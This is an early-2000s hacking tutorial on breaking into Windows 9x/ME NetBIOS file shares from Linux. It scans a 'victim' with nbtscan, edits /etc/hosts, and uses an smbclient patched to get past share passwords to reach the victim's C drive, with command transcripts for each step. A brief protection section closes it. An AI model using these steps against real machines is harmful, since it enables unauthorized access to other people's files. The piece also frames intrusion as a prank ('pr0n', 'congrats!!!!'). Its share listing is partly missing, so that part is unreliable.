Using Netbios Against 9x/Me from Linux

By: BrainRawt

Hacking Windows 9x/ME Netbios With Linux
Author: BrainRawt
Email: brainrawt@hotmail.com
Site: http://www.haxworx.com

Updated on 5-11-02

REQUIRED TOOLS:
root access (for /etc/hosts modification)
nbtscan (find it at www.freshmeat.net)
samba (should be on your linux distrobution cds)



/* We will start out by checking the victims computer for file and
print sharing with nbtscan. */


[brainrawt@linuxusers.com nbtscan]$ ./nbtscan 192.168.0.1
Doing NBT name scan on 192.168.0.1



 IP address       NetBIOS Name     Server    User             MAC address

 ------------------------------------------------------------------------------

 192.168.0.1      winbox           <server>  BRAINRAWT        00-02-e3-0a-17-40


[brainrawt@linuxusers.com nbtscan]$


/* We now know that our victim has file and print sharing enabled. */


/* Lets add our victims netbios name and ip address to our /etc/hosts file */

[root@linuxusers.com brainrawt]# echo 192.168.0.1 winbox >> /etc/hosts


/* We now have "winbox" in our /etc/hosts file. Lets move on to smbclient. */

/* Win9x/ME netbios only sees the 1st byte of the passwd at a lower level format.

If you are able to modify the "client.c" file of smbclient before you compile it
then you can bypass the password protected win9x/ME boxes. :) NOTE: There is a
patch for client.c floating around on the internet. */

/* Its time we check out our victim and see what they have to offer. Sometimes
we even get write access. :) */

[brainrawt@linuxusers.com brainrawt]$ smbclient -L winbox

Password: <-- no passwd needed. My smbclient is patched. :)



        Sharename      Type      Comment

/* As you can see above. Our victim is sharing "c, mp3s, and pr0n". */

/* Now its time we make a connection to one of those shares and look around. */

[brainrawt@linuxusers.com brainrawt]$ smbclient //winbox/c

Password: <-- no passwd needed. My smbclient is patched. :)
smb> <-- congrats!!!! You have access. type "help" for help on the smbclient
commands.


-------------------------------------------------
Protecting Oneself Against this netbios attack
-------------------------------------------------

1. If you dont need file and print sharing then disable it by removing the
        check marks from "File and Print Sharing" in c:control-panelnetwork.

2 If you are on a network and have to have File and Print Sharing Enabled
        then i suggest that you get a firewall and filter netbios allowing only
        your internal network to connect.

You can get the "BlackIce" firewall from "www.networkice.com".

3. NOTE: Always use passwords on shared resources.
